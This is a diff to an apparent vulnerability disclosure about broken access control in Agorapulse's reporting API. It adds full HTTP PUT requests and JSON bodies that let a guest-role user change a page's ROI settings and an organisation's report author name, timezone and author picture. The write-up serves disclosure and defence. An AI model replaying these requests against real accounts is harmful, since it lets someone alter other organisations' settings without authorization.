@@ -49,7 +49,7 @@ GET /api/bootstrap?accountId=574034 HTTP/1.1
 Host: manager.agorapulse.com 
 Connection: close sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92" 
 Accept: application/json, text/plain, */* 
-Authorization: Bearer <value> 
+Authorization: Bearer [Value] 
 Agorapulse-Agent: manager-2021.08.03.0929 
 Content-Type: application/json 
 Origin: https://app.agorapulse.com 
@@ -76,7 +76,7 @@ GET /api/organizations/[org-id]?organizationId=[org-id] HTTP/1.1
 Host: manager.agorapulse.com 
 Connection: close sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92" 
 Accept: application/json, text/plain, */* 
-Authorization: Bearer <value> 
+Authorization: Bearer [Value]
 Agorapulse-Agent: manager-2021.08.03.0929 
 Content-Type: application/json 
 Origin: https://app.agorapulse.com 
@@ -108,7 +108,7 @@ With guest permission in an organization, the user has limited access to the org
 
 But we were able to identify a Vulnerable api endpoint through which a user with guest permission was able to change the ROI settings of a page.
 
-- In the below request, by passing the id parameter of a page, a user with guest permission was able to change the ROI settings of that page without any access to it. 
+In the below request, by passing the id parameter of a page, a user with guest permission was able to change the ROI settings of any target page without any access to it. 
 
 
 ```http
@@ -117,7 +117,8 @@ Host: api.report.agorapulse.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0 
 Accept: application/json, text/plain, */* 
 Accept-Language: en-US,en;q=0.5 
-Referer: https://app.agorapulse.com/ Agorapulse-Agent: manager-2021.08.04.1214 
+Referer: https://app.agorapulse.com/ 
+Agorapulse-Agent: manager-2021.08.04.1214 
 Authorization: Bearer [VALUE]
 Content-Type: application/json 
 Content-Length: 118 
@@ -126,9 +127,9 @@ Origin: https://app.agorapulse.com
 {"roiEnabled":true,"postImpressionValue":5,"postLinkClickValue":1,"userEngagedValue":1,"accountUid":"facebook_574024"}
 ```
 
+The above request returned a '200 OK' response, indicating that changes were made to the target page. By returning to the ROI setting of a page through an admin account, we were able to confirm that an attacker with the guest role was indeed able to change the ROI setting of the page.
 
-
-![image](https://user-images.githubusercontent.com/88488902/197342689-59d607b0-c473-45ee-8f72-f7755c8bdeb7.png)
+![image](https://user-images.githubusercontent.com/88488902/197372663-b8c3e60d-4251-4dfc-8e60-9c564ff61c56.png)
 
 
 
@@ -138,18 +139,44 @@ Origin: https://app.agorapulse.com
 ## Changing general report settings like logo, timezone etc.
 
 With guest permission in an organization, a user has no access to the general settings of social media profiles. Due to limited permissions, the guest user is not able to change the report settings. 
+
 But we were able to identify a broken api path through which a user with guest permissions was able to change the general report settings of a organisation.The broken access on the vulnerable endpoint lets a guest change the timezone, author name, and logo for the reports.
 
-- Add reporter name and other general report settings
 
+Leveraging the above request, we can keep any random author for this organisation and also change the *timezone settings*, which can lead to disruption in automatic postings on accounts.
 
 ```http
 PUT /api/organizations/287157/workspaces/187158/settings/accounts/facebook_574363 HTTP/1.1
+Host: api.report.agorapulse.com
+Connection: close
+Content-Length: 124
+Authorization: Bearer 
+Agorapulse-Agent: manager-2021.08.10.0923
+Content-Type: application/json
+Origin: https://app.agorapulse.com
+Referer: https://app.agorapulse.com/
+Accept-Language: en-US,en;q=0.9
 
 {"accountUid":"facebook_574363","authorName":"Waris","browserTimezoneEnabled":true,"locale":"en","timezone":"Asia/Calcutta"}
 ```
 
-Leveraging this request, we can keep any random author for this organisation and also change the *timezone settings*, which can lead to disruption in automatic postings on accounts.
+We also discovered that it was possible to change the Authors Profile Picture by simply adding a new key (authorPictureUrl) in JSON request. So, if we send the above request with the authorization token of the guest and add a new key and value in JSON body which is authorPictureURl and then click on the send button, we can see the response is 200 ok, which means that a guest can change the author name, time zone, and profile picture without having any permissions.
+
+
+```http
+PUT /api/organizations/287157/workspaces/187158/settings/accounts/facebook_574363 HTTP/1.1
+Host: api.report.agorapulse.com
+Connection: close
+Content-Length: 124
+Authorization: Bearer 
+Agorapulse-Agent: manager-2021.08.10.0923
+Content-Type: application/json
+Origin: https://app.agorapulse.com
+Referer: https://app.agorapulse.com/
+Accept-Language: en-US,en;q=0.9
+
+{"accountUid":"facebook_574363","authorName":"Waris","authorPictureUrl":"PICTURE-URL","browserTimezoneEnabled":true,"locale":"en","timezone":"Asia/Calcutta"}
+```
 
 
 ## Changing rules of inbox assistant from an unauthorized role
